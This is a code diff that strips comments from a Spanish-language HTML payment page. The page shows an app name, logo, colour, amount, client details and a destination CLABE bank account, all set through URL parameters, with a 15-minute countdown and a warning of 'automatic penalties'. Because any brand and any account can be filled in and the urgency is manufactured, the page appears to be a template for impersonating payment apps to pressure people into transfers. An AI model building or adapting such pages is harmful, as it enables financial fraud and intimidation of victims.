@@ -14,7 +14,6 @@
 <body>
 
     <div class="detail-card">
-        <!-- Encabezado con color dinámico -->
         <div id="header-bg" class="pt-10 pb-6 text-center text-white flex flex-col items-center justify-center">
             <div class="w-20 h-20 bg-white rounded-3xl mb-3 flex items-center justify-center overflow-hidden border-4 border-white/20 shadow-md">
                 <img id="img-app" src="" class="w-full h-full object-cover">
@@ -22,16 +21,13 @@
             <h2 id="txt-app" class="text-xl font-black uppercase tracking-wider"></h2>
         </div>
 
-        <!-- Contenido de Pago -->
         <div class="p-6 space-y-6">
             <div>
                 <span class="text-[10px] text-gray-400 font-bold uppercase tracking-wider block">Monto a Pagar</span>
                 <span id="txt-monto" class="text-4xl font-black text-slate-800">$0.00</span>
-                <!-- Contador de tiempo inverso como en tu diseño original -->
                 <span id="timer" class="text-base font-black text-red-500 block mt-1">14:59</span>
             </div>
 
-            <!-- Tabla de datos limpios -->
             <div class="bg-slate-50 rounded-[2rem] p-5 text-left space-y-4 border border-slate-100 text-xs font-bold text-slate-700">
                 <div class="flex justify-between border-b border-slate-200/60 pb-2">
                     <span class="text-gray-400 uppercase text-[9px] tracking-wider">Cliente</span>
@@ -46,7 +42,6 @@
                     <span id="txt-banco" class="font-black text-slate-900">BBVA</span>
                 </div>
 
-                <!-- Bloque de transferencia interactivo -->
                 <div class="pt-2 text-center space-y-2">
                     <span class="text-[9px] text-gray-400 uppercase tracking-wider block">CLABE Para Transferir</span>
                     <div class="flex items-center justify-center space-x-2 bg-white border border-slate-200/80 rounded-xl p-2.5 shadow-sm">
@@ -60,7 +55,6 @@
                 </div>
             </div>
 
-            <!-- Advertencia inferior idéntica -->
             <p class="text-[9px] font-black text-red-500 uppercase leading-tight px-4">
                 ⚠️ Advertencia: Realiza el pago en menos de 15 minutos para evitar penalizaciones automáticas.
             </p>
@@ -68,27 +62,22 @@
     </div>
 
     <script>
-        // Procesamiento de parámetros dinámicos de URL
         const p = new URLSearchParams(window.location.search);
         
-        // Colores y Elementos Visuales Dinámicos
         document.getElementById('header-bg').style.backgroundColor = p.get('c1') || '#820ad1';
         document.getElementById('img-app').src = p.get('img') || '';
         document.getElementById('txt-app').innerText = p.get('v') || 'Aplicación';
 
-        // Textos Dinámicos
         const montoFormateado = parseFloat(p.get('m') || 0).toLocaleString('es-MX', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
         document.getElementById('txt-monto').innerText = '$' + montoFormateado;
         document.getElementById('txt-cliente').innerText = p.get('n') || 'CLIENTE';
         document.getElementById('txt-tel').innerText = p.get('t') || '0000000000';
         document.getElementById('txt-clabe').innerText = p.get('c') || '000000000000000000';
 
-        // Limpieza Automática del Banco Destino (ej: "BBVA 1" -> "BBVA")
         let bancoLimpio = p.get('b') || 'BBVA';
         bancoLimpio = bancoLimpio.replace(/[123]/g, '').trim(); 
         document.getElementById('txt-banco').innerText = bancoLimpio;
 
-        // Lógica del Temporizador Regresivo (14:59)
         let tiempo = 15 * 60 - 1;
         const timerElement = document.getElementById('timer');
         const interval = setInterval(() => {
@@ -100,7 +89,6 @@
             tiempo--;
         }, 1000);
 
-        // Función nativa para copiar la clave al portapapeles
         function copiarClabe() {
             const clabe = document.getElementById('txt-clabe').innerText;
             navigator.clipboard.writeText(clabe).then(() => {
